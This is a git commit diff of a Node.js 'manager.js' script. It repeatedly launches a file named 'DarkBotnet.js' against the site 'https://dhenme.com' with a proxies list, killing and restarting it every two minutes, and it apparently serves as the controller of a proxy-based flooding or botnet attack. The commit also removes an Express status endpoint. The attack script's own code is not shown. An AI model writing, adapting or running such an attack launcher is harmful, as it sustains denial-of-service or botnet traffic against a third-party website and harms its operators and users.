1ccbfb353777b3a4815a50650b13e5ddb14a8e32
Mytt2024 <mytt@l00th.com>
2024-09-03 17:02:34 +0500

    Update manager.js

--- manager.js
+++ manager.js
@@ -1,63 +1,45 @@
-const express = require('express');
 const { exec } = require('child_process');
 
-// Set up Express app
-const app = express();
-const port = 8889;
-
-let scriptOutput = [];
+const url = "https://dhenme.com";
+const port = "12000";
+const param1 = "1";
+const param2 = "1";
+const proxyFile = "proxies.txt";
 
 // Function to run the app.js script
 function runScript() {
-    const url = "https://dhenme.com";
-    const port = "12000";
-    const param1 = "1";
-    const param2 = "1";
-    const proxyFile = "proxies.txt";
-    const command = `node script.js ${url} ${port} ${param1} ${param2} ${proxyFile}`;
-    //console.log(`Starting script: ${command}`);
+    const command = `node DarkBotnet.js ${url} ${port} ${param1} ${param2} ${proxyFile}`;
+    console.log(`Starting script: ${command}`);
 
     const process = exec(command);
 
     process.stdout.on('data', (data) => {
-        scriptOutput.push(`stdout: ${data}`); // Append output to scriptOutput array
-        if (scriptOutput.length > 20) { // Keep only the last 20 entries
-            scriptOutput.shift();
-        }
+        console.log(`stdout: ${data}`);
     });
 
     process.stderr.on('data', (data) => {
-        scriptOutput.push(`stderr: ${data}`); // Append output to scriptOutput array
-        if (scriptOutput.length > 20) { // Keep only the last 20 entries
-            scriptOutput.shift();
-        }
+        console.error(`stderr: ${data}`);
     });
 
     process.on('close', (code) => {
-        scriptOutput.push(`Script exited with code ${code}`); // Append exit code to scriptOutput array
-        if (scriptOutput.length > 20) { // Keep only the last 20 entries
-            scriptOutput.shift();
-        }
-        //console.log('Restarting script...');
-        runScript();
+        console.log(`Script exited with code ${code}`);
     });
 
     // Stop the script after 2 minutes (120000 milliseconds)
     setTimeout(() => {
-        //console.log('Stopping script...');
+        console.log('Stopping script...');
         process.kill(); // Terminate the script
+        waitAndRestart();
     }, 120000);
 }
 
-// Set up /status endpoint to return script output
-app.get('/status', (req, res) => {
-    res.send(`<pre>${scriptOutput.join('\n')}</pre>`); // Join array elements with newlines
-});
-
-// Start the Express server
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-});
+// Function to wait for 5 seconds and restart the script
+function waitAndRestart() {
+    setTimeout(() => {
+        console.log('Restarting script...');
+        runScript();
+    }, 5000);
+}
 
 // Start the process for the first time
 runScript();
